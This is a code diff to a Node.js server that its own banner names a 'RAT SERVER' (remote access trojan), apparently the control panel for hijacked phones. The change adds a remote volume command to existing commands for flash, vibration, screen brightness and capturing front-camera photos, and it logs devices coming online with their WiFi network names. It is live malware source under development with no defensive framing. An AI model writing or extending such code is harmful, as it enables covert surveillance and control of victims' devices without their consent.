@@ -144,7 +144,7 @@ app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
     
     const deviceName = devices.get(deviceId)?.deviceName || deviceId;
     
-    // LOG PERTAMA: PROSES (TAMBAH BRIGHTNESS)
+    // LOG PERTAMA: PROSES
     if (command === 'flash') {
         console.log(`📸 [FLASH] SENDING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
     } else if (command === 'camera') {
@@ -153,6 +153,8 @@ app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
         console.log(`📳 [VIBRATE] SENDING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
     } else if (command === 'brightness') {
         console.log(`🔆 [BRIGHTNESS] SETTING -> ${deviceName} (${deviceId}) | LEVEL: ${params?.level || 50}%`);
+    } else if (command === 'volume') {
+        console.log(`🔊 [VOLUME] SETTING -> ${deviceName} (${deviceId}) | LEVEL: ${params?.level || 50}% | TYPE: ${params?.type || 'music'}`);
     }
     
     res.json({ success: true, commandId, message: 'Command sent' });
@@ -183,7 +185,7 @@ app.post('/api/device/command/result', (req, res) => {
         
         const deviceName = devices.get(deviceId)?.deviceName || deviceId;
         
-        // LOG KEDUA: HASIL (TAMBAH BRIGHTNESS)
+        // LOG KEDUA: HASIL
         if (deviceCommands[commandIndex].command === 'flash') {
             if (status === 'completed') {
                 console.log(`✅ [FLASH] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
@@ -207,6 +209,12 @@ app.post('/api/device/command/result', (req, res) => {
                 console.log(`✅ [BRIGHTNESS] SUCCESS -> ${deviceName} | LEVEL: ${result?.level}%`);
             } else {
                 console.log(`❌ [BRIGHTNESS] FAILED -> ${deviceName}`);
+            }
+        } else if (deviceCommands[commandIndex].command === 'volume') {
+            if (status === 'completed') {
+                console.log(`✅ [VOLUME] SUCCESS -> ${deviceName} | LEVEL: ${result?.level}% | TYPE: ${result?.type || 'music'}`);
+            } else {
+                console.log(`❌ [VOLUME] FAILED -> ${deviceName}`);
             }
         }
     }
@@ -400,7 +408,7 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`
 ╔══════════════════════════════════════════════════════════════╗
-║              QUANTUMX RAT SERVER v4.0 - FINAL                ║
+║              QUANTUMX RAT SERVER v5.0 - FINAL                ║
 ╠══════════════════════════════════════════════════════════════╣
 ║  RUNNING ON PORT: ${PORT}                                                ║
 ║  WEBSOCKET: ws://localhost:${PORT}                                       ║
@@ -410,7 +418,8 @@ server.listen(PORT, () => {
 ╠══════════════════════════════════════════════════════════════╣
 ║  📸 FLASH      - Kontrol LED flash                           ║
 ║  📳 VIBRATE    - Getar perangkat                             ║
-║  🔆 BRIGHTNESS - Atur kecerahan layar (real-time)            ║
+║  🔆 BRIGHTNESS - Atur kecerahan layar                        ║
+║  🔊 VOLUME     - Atur volume media                           ║
 ║  📷 CAMERA     - Ambil foto kamera depan                     ║
 ╠══════════════════════════════════════════════════════════════╣
 ║                      LOG FORMAT                                ║
@@ -421,6 +430,8 @@ server.listen(PORT, () => {
 ║  ✅ [VIBRATE] SUCCESS -> Device | DURATION: 2s               ║
 ║  🔆 [BRIGHTNESS] SETTING -> Device | LEVEL: 75%              ║
 ║  ✅ [BRIGHTNESS] SUCCESS -> Device | LEVEL: 75%              ║
+║  🔊 [VOLUME] SETTING -> Device | LEVEL: 50% | TYPE: music    ║
+║  ✅ [VOLUME] SUCCESS -> Device | LEVEL: 50% | TYPE: music    ║
 ║  📷 [CAMERA] CAPTURING -> Device                              ║
 ║  ✅ [CAMERA] SUCCESS -> Device | PHOTO TAKEN                  ║
 ║  📱 [DEVICE] ONLINE -> Device | NETWORK: WiFi SSID            ║
